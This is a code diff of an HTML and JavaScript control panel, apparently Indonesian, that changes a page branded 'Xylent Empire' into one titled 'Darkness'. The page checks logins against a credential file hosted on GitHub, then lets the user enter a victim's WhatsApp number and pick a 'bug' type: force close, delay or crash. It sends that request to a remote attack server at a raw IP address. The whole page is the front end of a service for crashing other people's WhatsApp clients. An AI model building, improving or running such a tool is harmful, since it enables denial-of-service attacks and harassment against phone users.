@@ -2,16 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Xylent Empire</title>
-  <!-- Tetap pakai icon -->
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Darkness</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
   <style>
     :root {
-      --main: white;
-      --second: white;
+      --main: pink;
+      --second: pink;
       --bg: #0e0e0e;
-      --text: #eeeeee;
+      --text: pink;
     }
     * {
       margin: 0;
@@ -20,8 +19,8 @@
       font-family: sans-serif;
     }
     body {
-      background: var(--bg);
-      color: var(--text);
+      background: black;
+      color: black;
       min-height: 100vh;
       display: flex;
       justify-content: center;
@@ -29,31 +28,24 @@
       padding: 20px;
       position: relative;
     }
-#result {
-  font-weight: bold;
-  padding: 10px;
-  margin-top: 10px;
-  text-align: center;
-  animation: fadeIn 0.5s ease-in-out;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(5px); }
-  to   { opacity: 1; transform: translateY(0); }
-}
-    #particles-js {
-      position: fixed;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
+    #result {
+      font-weight: bold;
+      padding: 10px;
+      margin-top: 10px;
+      text-align: center;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(5px); }
+      to   { opacity: 1; transform: translateY(0); }
     }
     .glass-box {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: black;
+      border: 1px solid black;
       border-radius: 20px;
       padding: 30px;
       backdrop-filter: blur(10px);
-      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 25px black;
       z-index: 2;
       max-width: 450px;
       width: 100%;
@@ -66,21 +58,21 @@
       margin-bottom: 25px;
     }
     .profile img {
-      width: 100px;
-      height: 100px;
+      width: 200px;
+      height: 200px;
       border-radius: 50%;
-      border: 2px solid var(--main);
-      box-shadow: 0 0 15px var(--main);
+      border: 2px black;
+      box-shadow: 0 0 15px black;
     }
     .profile-info h2 {
       font-size: 1.2rem;
-      color: var(--main);
+      color: black;
       margin-bottom: 10px;
-      text-shadow: 0 0 8px var(--main);
+      text-shadow: 0 0 8px black;
     }
     .status {
       font-size: 0.9rem;
-      color: #bbbb;
+      color: #bbbbbb;
     }
     .status i {
       color: var(--main);
@@ -95,7 +87,7 @@
     }
     h3 {
       font-size: 1.4rem;
-      color: #bbbb;
+      color: #bbbbbb;
       margin-bottom: 20px;
       text-align: center;
     }
@@ -122,42 +114,6 @@
       border: 1px solid var(--main);
       background: rgba(255, 255, 255, 0.1);
     }
-    .bug-options {
-  display: flex;
-  justify-content: space-between;
-  gap: 10px;
-  flex-wrap: nowrap;
-  margin-top: 10px;
-}
-.bug-card {
-  flex: 1;
-  text-align: center;
-  padding: 12px;
-  border-radius: 12px;
-  background: #111;
-  color: white;
-  cursor: pointer;
-  transition: 0.3s;
-  box-shadow: 0 0 10px rgba(255, 255, 255, 1);
-  border: 1px solid #444;
-  min-width: 0; /* agar responsive */
-}
-    .bug-card i {
-      font-size: 1.2rem;
-      color: var(--main);
-    }
-    .bug-card span {
-      font-size: 1rem;
-      color: white;
-    }
-    .bug-card:hover {
-      background: rgba(255, 255, 255, 0.1);
-      transform: scale(1.03);
-    }
-    .bug-card.active {
-      border: 2px solid var(--main);
-      box-shadow: 0 0 12px var(--main);
-    }
     button {
       background: linear-gradient(135deg, var(--main), var(--second));
       border: none;
@@ -175,179 +131,149 @@
       transition: 0.3s;
       margin-top: 30px;
     }
-    button-two {
-      background: linear-gradient(135deg, var(--main), var(--second));
-      border: none;
-      color: black;
-      width: 100%;
-      padding: 14px;
-      border-radius: 50px;
-      font-size: 1rem;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      box-shadow: 0 0 15px var(--main);
-      transition: 0.3s;
-      margin-top: 10px;
-    }
-    .user-table-wrapper {
-      max-height: 200px;
-      overflow-y: auto;
-      margin-top: 10px;
-      border-top: 1px solid rgba(255, 255, 255, 0.1);
-      padding-top: 10px;
-    }
-    .user-table-wrapper::-webkit-scrollbar {
-      width: 6px;
-    }
-    .user-table-wrapper::-webkit-scrollbar-thumb {
-      background: #666;
+    .notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.9);
+      color: white;
+      padding: 15px 30px;
       border-radius: 10px;
+      display: none;
+      z-index: 1000;
+      text-align: center;
+      max-width: 80%;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      border: 1px solid white;
     }
   </style>
 </head>
 <body>
-  <div id="particles-js"></div>
-  <div id="login-box" class="glass-box">
-  <h1 style="text-align: center;">Xylent Empire</h1>
-    <h3>Login</h3>
+  <div class="glass-box" id="login-box">
+    <div class="profile">
+      <img src="https://files.catbox.moe/86hgyu.jpg" alt="profile" />
+    </div>
     <input type="text" id="username" placeholder="Username" />
     <input type="password" id="password" placeholder="Password" />
-    <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
+    <button onclick="login()"> Login</button>
     <div id="login-result" style="margin-top:10px; text-align:center;"></div>
-    </div>
+  </div>
 
   <div class="glass-box" id="main-box" style="display:none;">
     <div class="profile">
-      <img src="https://files.catbox.moe/86hgyu.jpg" alt="profile">
-      <div class="profile-info">
-        <h2 id="userLabel" style="text-align: center;">Xylent Empire</h2>
-        <span class="status"><i class="fas fa-circle" style="color:#00ff00"></i> Server Online</span>
-      </div>
+      <img src="https://files.catbox.moe/86hgyu.jpg" alt="profile" />
     </div>
-    <input type="text" id="target" placeholder="Masukkan nomor target (cth: 628xxxx" />
-    <div class="bug-options">
-      <div class="bug-card active" data-bug="force">
-        <span>FC Invisible</span>
-      </div>
-      <div class="bug-card" data-bug="delay">
-        <span>Invisible Delay</span>
-      </div>
-      <div class="bug-card" data-bug="crash">
-        <span>Blank WhatsApp</span>
-      </div>
-    </div>
-    <button id="sendBtn" onclick="sendBug()"></i> Send Bug</button>
-<div id="result" style="margin-top:10px; text-align:center;"></div>
-    <button onclick="logout()">Logout</button>
-   </div>
+    <input type="text" id="target" placeholder="Masukkan nomor target (cth: 628xxxx)" />
+    <select id="bug-type-select">
+      <option value="force">Force</option>
+      <option value="delay">Delay</option>
+      <option value="crash">Crash</option>
+    </select>
+    <button id="sendBtn" onclick="sendBug()"> Send Bug</button>
+  </div>
 
-<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-<script>
-particlesJS("particles-js", {
-  particles: { number: { value: 60, density: { enable: true, value_area: 800 }},
-  color: { value: "#ffffff" }, shape: { type: "circle" },
-  opacity: { value: 0.4 }, size: { value: 3, random: true },
-  line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.3, width: 1 },
-  move: { enable: true, speed: 2, direction: "none", random: false }},
-  interactivity: {
-    events: { onhover: { enable: true, mode: "grab" }, onclick: { enable: false }},
-    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
-  }, retina_detect: true
-});
+  <div class="notification" id="notification"></div>
 
-const AKUN_JSON_URL = "https://raw.githubusercontent.com/evilcrasher-ctrl/security/refs/heads/main/akunb.json"; // GANTI DENGAN URL PUNYAMU
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    const AKUN_JSON_URL = "https://raw.githubusercontent.com/evilcrasher-ctrl/security/refs/heads/main/akunb.json";
 
-async function getUsers() {
-  try {
-    const res = await fetch(AKUN_JSON_URL + "?t=" + Date.now()); // agar cache tidak nempel
-    return await res.json();
-  } catch (e) {
-    console.error("Gagal fetch user:", e);
-    return [];
-  }
-}
+    async function getUsers() {
+      try {
+        const res = await fetch(AKUN_JSON_URL + "?t=" + Date.now());
+        return await res.json();
+      } catch (e) {
+        console.error("Gagal fetch user:", e);
+        return [];
+      }
+    }
 
-function getSession() {
-  return JSON.parse(localStorage.getItem("currentUser"));
-}
+    function getSession() {
+      return JSON.parse(localStorage.getItem("currentUser "));
+    }
 
-function saveSession(user) {
-  localStorage.setItem("currentUser", JSON.stringify(user));
-}
+    function saveSession(user) {
+      localStorage.setItem("currentUser ", JSON.stringify(user));
+    }
 
-function logout() {
-  localStorage.removeItem("currentUser");
-  location.reload();
-}
+    async function login() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      const resultDiv = document.getElementById("login-result");
 
-async function login() {
-  const user = document.getElementById("username").value.trim();
-  const pass = document.getElementById("password").value.trim();
-  const result = document.getElementById("login-result");
+      const users = await getUsers();
+      const found = users.find(u => u.username === user && u.password === pass);
 
-  const users = await getUsers(); // ✅ tunggu data dari GitHub
+      if (found) {
+        saveSession(found);
+        showDashboard(found);
+      } else {
+        resultDiv.innerText = "❌ Username atau Password salah!";
+        resultDiv.style.color = "crimson";
+      }
+    }
 
-  const found = users.find(u => u.username === user && u.password === pass);
+    function showDashboard(user) {
+      document.getElementById("login-box").style.display = "none";
+      document.getElementById("main-box").style.display = "block";
+    }
 
-  if (found) {
-    saveSession(found);
-    showDashboard(found);
-  } else {
-    result.innerText = "❌ Username atau Password salah!";
-    result.style.color = "crimson";
-  }
-}
+    document.addEventListener("DOMContentLoaded", async () => {
+      const currentUser  = getSession();
+      if (currentUser ) {
+        showDashboard(currentUser );
+      }
+    });
 
-function showDashboard(user) {
-  document.getElementById("login-box").style.display = "none";
-  document.getElementById("main-box").style.display = "block";
-  document.getElementById("userLabel").innerText = user.username;
-}
+    let selectedBug = "force"; // Default value
 
-let selectedBug = "force";
-document.querySelectorAll(".bug-card").forEach(card => {
-  card.addEventListener("click", () => {
-    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
-    card.classList.add("active");
-    selectedBug = card.getAttribute("data-bug");
-  });
-});
+    document.getElementById("bug-type-select").addEventListener("change", (event) => {
+      selectedBug = event.target.value;
+    });
 
-async function sendBug() {
-  const input = document.getElementById("target").value.trim();
-  const resDiv = document.getElementById("result");
-  const btn = document.getElementById("sendBtn");
+    async function sendBug() {
+      const input = document.getElementById("target").value.trim();
+      const resDiv = document.getElementById("result");
+      const btn = document.getElementById("sendBtn");
+      const notification = document.getElementById("notification");
 
-  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
-    resDiv.innerText = "❌ Masukkan nomor WA valid";
-    resDiv.style.color = "crimson";
-    return;
-  }
+      if (!/^\d+(?:@s\.whatsapp\.net)?$/.test(input)) {
+        showNotification("❌ Masukkan  Nomor Target!", "crimson");
+        return;
+      }
 
-  const chatId = `${input}@s.whatsapp.net`;
-  btn.disabled = true;
-  const originalHTML = btn.innerHTML;
-  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
-  resDiv.innerText = "";
+      const chatID = `${input}@s.whatsapp.net`;
+      btn.disabled = true;
+      const originalHTML = btn.innerHTML;
+      btn.innerHTML = '<span class="spinner"></span> Mengirim...';
+      resDiv.innerText = "";
 
-  try {
-    const res = await fetch(`https://darknes.mydigital-store.me/darknes?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-    if (!res.ok) throw new Error("Respon API error");
-    const json = await res.json();
+      try {
+        const res = await fetch(`http://134.209.151.243:2291/session?chatId=${encodeURIComponent(chatID)}&type=${selectedBug}`);
+        if (!res.ok) throw new Error("Respon API error");
+        const json = await res.json();
+        showNotification(`Sukses mengirim bug "${selectedBug}" ke ${input}`, true);
+      } catch (err) {
+        showNotification(`Gagal mengirim bug: ` + err.message, false);
+      }
 
-    resDiv.innerText = `✅ Sukses mengirim bug "${selectedBug}" ke ${input}`;
-    resDiv.style.color = "#00ff99";
-  } catch (err) {
-    resDiv.innerText = "❌ Gagal mengirim bug: " + err.message;
-    resDiv.style.color = "crimson";
-  }
+      btn.disabled = false;
+      btn.innerHTML = originalHTML;
+    }
 
-  btn.disabled = false;
-  btn.innerHTML = originalHTML;
-}
-</script>
+    function showNotification(message, isSuccess) {
+      const notification = document.getElementById("notification");
+      notification.textContent = message;
+      notification.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
+      notification.style.color = 'white';
+      notification.style.border = '1px solid white';
+      notification.style.display = "block";
+
+      setTimeout(() => {
+        notification.style.display = "none";
+      }, 2000);
+    }
+  </script>
 </body>
 </html>
